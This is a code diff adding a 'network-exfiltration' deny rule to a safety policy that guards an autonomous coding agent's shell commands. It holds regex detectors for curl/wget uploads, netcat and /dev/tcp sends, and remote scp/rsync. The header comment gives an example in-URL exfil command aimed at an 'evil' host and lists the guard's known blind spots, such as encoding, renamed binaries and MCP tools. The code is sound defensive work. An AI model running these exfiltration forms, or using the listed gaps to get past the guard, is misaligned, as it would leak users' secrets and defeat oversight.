@@ -8,13 +8,37 @@
  * SCOPE & LIMITS — read before extending. This is a *defense-in-depth heuristic*,
  * not a sandbox. Shell is adversarial: a determined prompt-injection can evade a
  * string matcher (base64-decode-then-exec, `$(printf …)`, exotic interpreters,
- * renamed binaries). The goal here is to stop the *obvious, irreversible*
- * footguns — `rm -rf`, `sudo`, `curl | sh`, force-push, hard-reset, disk wipes —
- * that account for the worst accidental blast radius, NOT to be a complete
- * containment boundary. Real containment is the workspace-trust gate + OS sandbox.
- * Keep the rule set tight and well-tested: every false
- * positive blocks legitimate agent work, so we deny only forms that are
- * essentially never the right call inside an autonomous coding run.
+ * renamed binaries). The goal here is to stop the *obvious, irreversible or
+ * exfiltrating* footguns — `rm -rf`, `sudo`, `curl | sh`, force-push, hard-reset,
+ * disk wipes, and outbound data uploads (`curl -d @secret`, `… | nc host`) — that
+ * account for the worst accidental blast radius, NOT to be a complete containment
+ * boundary. Real containment is the workspace-trust gate + OS sandbox. Keep the
+ * rule set tight and well-tested: every false positive blocks legitimate agent
+ * work, so we deny only forms that are essentially never the right call inside an
+ * autonomous coding run.
+ *
+ * EGRESS — what the `network-exfiltration` rule does and does NOT cover. It denies
+ * the OBVIOUS Bash upload forms — `curl`/`wget` carrying a request body or upload
+ * flag, a pipe/redirect into a raw socket (`nc`/`ncat`/`socat`, `>/dev/tcp/…`), and
+ * `scp`/`sftp`/`rsync` to a remote host — because those are the "send local data
+ * out" shapes and are ~never right in an autonomous coding run. It is DELIBERATELY
+ * blind to: data smuggled inside a GET URL/query string (`curl https://evil/?x=$(…)`)
+ * or hidden by encoding, since separating that from a legitimate fetch needs data-
+ * flow analysis, not a string match; and any transfer via an SDK/MCP tool or a
+ * renamed binary.
+ *
+ * This rule is the SHELL-level egress line only — it does NOT govern the native
+ * `WebFetch`/`WebSearch` tools. Those are a separate egress channel, closed a
+ * separate way: `resolveKindPreset` puts them in `disallowedTools` (which the SDK
+ * enforces regardless of `permissionMode`, so it bites under `bypassPermissions`)
+ * for every task kind EXCEPT the deliberately web-enabled `research` kind, and the
+ * Insight/Harness scans deny them via `ANALYSIS_DISALLOWED_TOOLS`. So for the
+ * default `build`/`tdd`/`review`/`decompose` kinds, WebFetch/WebSearch egress is
+ * shut; `research` is the explicit per-task web opt-in (a future per-URL WebFetch
+ * allowlist would narrow even that). The remaining gaps — in-URL GET exfil, MCP
+ * writers, renamed binaries, a Bash read of a secret this gate can't parse — are
+ * the job of the OS sandbox (the tiered-sandbox roadmap); the read side is further
+ * narrowed by the sensitive-read guard in `workspace-confinement.ts`.
  */
 
 /** The bash tool name the rules below inspect. */
@@ -236,6 +260,95 @@ function redirectsToDevice(raw: string): boolean {
   return /[>]\s*\/dev\/(?:sd|nvme|disk|vd|hd|mmcblk)/i.test(raw);
 }
 
+/** curl LONG flags that carry an outbound request body / uploaded file
+ *  (`--data*`, `--form*`, `--upload-file`, `--json`), value glued or spaced. */
+const CURL_UPLOAD_LONG_FLAG =
+  /^--(?:data(?:-[a-z]+)?|form(?:-string)?|upload(?:-file)?|json)(?:=|$)/;
+
+/** HTTP methods with a request body / mutating intent (an explicit `-X POST`
+ *  is the finding's exact exfil shape even before the `-d` payload). */
+const MUTATING_METHOD = /^(?:POST|PUT|PATCH|DELETE)$/i;
+
+/** A curl SHORT-flag token that carries body/upload data: a single-dash group
+ *  containing `d` (`--data`), `F` (`--form`), or `T` (`--upload-file`) — incl. a
+ *  glued value like `-d@file`. Case-sensitive on purpose: uppercase `-D`
+ *  (dump-header, a RESPONSE write) and download flags (`-O`/`-o`/`-fsSL`/`-I`)
+ *  carry none of `d`/`F`/`T`, so a plain fetch never matches. */
+function isCurlDataShortFlag(token: string): boolean {
+  return token.startsWith('-') && !token.startsWith('--') && /[dFT]/.test(token);
+}
+
+/** True for a `curl` command that SENDS a body — a data/form/upload/`--json`
+ *  flag, or an explicit mutating `-X`/`--request` method (incl. glued `-XPOST`).
+ *  A download (`curl -fsSL url -o file`, `curl -I url`) carries none of these. */
+function isCurlUpload(cmd: readonly string[]): boolean {
+  if (cmd.length === 0 || basename(cmd[0]!) !== 'curl') return false;
+  for (let i = 0; i < cmd.length; i += 1) {
+    const t = cmd[i]!;
+    if (CURL_UPLOAD_LONG_FLAG.test(t) || isCurlDataShortFlag(t)) return true;
+    if ((t === '-X' || t === '--request') && MUTATING_METHOD.test(cmd[i + 1] ?? ''))
+      return true;
+    const glued = /^(?:-X|--request=)(.+)$/.exec(t);
+    if (glued && MUTATING_METHOD.test(glued[1]!)) return true;
+  }
+  return false;
+}
+
+/** wget flags that POST a body / upload a file (`--post-data`, `--post-file`,
+ *  `--body-data`, `--body-file`), value glued or spaced. */
+const WGET_UPLOAD_LONG_FLAG = /^--(?:post-(?:data|file)|body-(?:data|file))(?:=|$)/;
+
+/** True for a `wget` command that SENDS a body (a `--post-*`/`--body-*` flag or a
+ *  mutating `--method`). A plain `wget url` download carries none of these. */
+function isWgetUpload(cmd: readonly string[]): boolean {
+  if (cmd.length === 0 || basename(cmd[0]!) !== 'wget') return false;
+  return cmd.some((t, i) => {
+    if (WGET_UPLOAD_LONG_FLAG.test(t)) return true;
+    if (t === '--method') return MUTATING_METHOD.test(cmd[i + 1] ?? '');
+    const glued = /^--method=(.+)$/.exec(t);
+    return glued !== null && MUTATING_METHOD.test(glued[1]!);
+  });
+}
+
+/** Tools that copy local files to another host. */
+const REMOTE_COPY_TOOLS = new Set(['scp', 'sftp', 'rsync']);
+
+/** A remote transfer target: `[user@]host:path` (the scp/rsync colon form) or an
+ *  explicit remote URL scheme (`rsync://`, `ssh://`, `scp://`, `sftp://`). Kept
+ *  narrow — a bare `host:path` without `@` is too easily a false hit, so we only
+ *  match the `user@host:` and scheme forms. */
+const REMOTE_TARGET = /^(?:[\w.-]+@[\w.-]+:|(?:rsync|ssh|scp|sftp):\/\/)/i;
+
+/** True for `scp`/`sftp`/`rsync` sending to a REMOTE host — exfiltration of local
+ *  files. A purely local `rsync a/ b/` (no remote token) never matches. */
+function isRemoteCopy(cmd: readonly string[]): boolean {
+  if (cmd.length === 0 || !REMOTE_COPY_TOOLS.has(basename(cmd[0]!))) return false;
+  return cmd.slice(1).some((t) => REMOTE_TARGET.test(t));
+}
+
+/** Raw-line socket-exfil forms the token parser can't see because the SIGNAL is a
+ *  pipe/redirect the parser splits on: piping data INTO a raw-socket tool, feeding
+ *  a file INTO one, or writing to a bash `/dev/tcp|udp/` pseudo-device. Matched on
+ *  the raw line, like the `curl|sh` pipe rule. `nc … > file` (RECEIVING) is left
+ *  alone — only the send direction (`|`, `<`, `>/dev/tcp`) is exfil. */
+function isSocketExfil(raw: string): boolean {
+  return (
+    /\|\s*(?:nc|ncat|netcat|socat)\b/i.test(raw) ||
+    /\b(?:nc|ncat|netcat|socat)\b[^\n|]*<\s*\S/i.test(raw) ||
+    /[>]\s*\/dev\/(?:tcp|udp)\//i.test(raw)
+  );
+}
+
+/** True for an outbound data transfer that could exfiltrate local secrets — a
+ *  curl/wget upload, a raw-socket send, or a remote scp/sftp/rsync. See the module
+ *  header for the deliberate blind spots (in-URL GET exfil, WebFetch, encodings). */
+function isNetworkExfiltration(ctx: CommandMatchContext): boolean {
+  if (isSocketExfil(ctx.raw)) return true;
+  return ctx.commands.some(
+    (cmd) => isCurlUpload(cmd) || isWgetUpload(cmd) || isRemoteCopy(cmd),
+  );
+}
+
 /**
  * The studio's safe default destructive-command deny set. Tight by design (see
  * the module header): each rule blocks a form that is essentially never the right
@@ -257,6 +370,13 @@ export const DEFAULT_DESTRUCTIVE_RULES: readonly ToolDenyRule[] = [
       'Blocked by Nightcore safety policy: piping a network download into a shell (curl|sh) executes unreviewed remote code. Download, inspect, then run.',
     tools: [BASH_TOOL],
     matches: (ctx) => isPipeToShell(ctx.raw),
+  },
+  {
+    id: 'network-exfiltration',
+    reason:
+      'Blocked by Nightcore safety policy: this looks like an outbound data transfer (uploading local data to a remote host via curl/wget, a raw socket, or scp/rsync), which could exfiltrate secrets from this machine. Fetch-only requests are fine; to SEND data externally, ask the user.',
+    tools: [BASH_TOOL],
+    matches: isNetworkExfiltration,
   },
   {
     id: 'privilege-escalation',
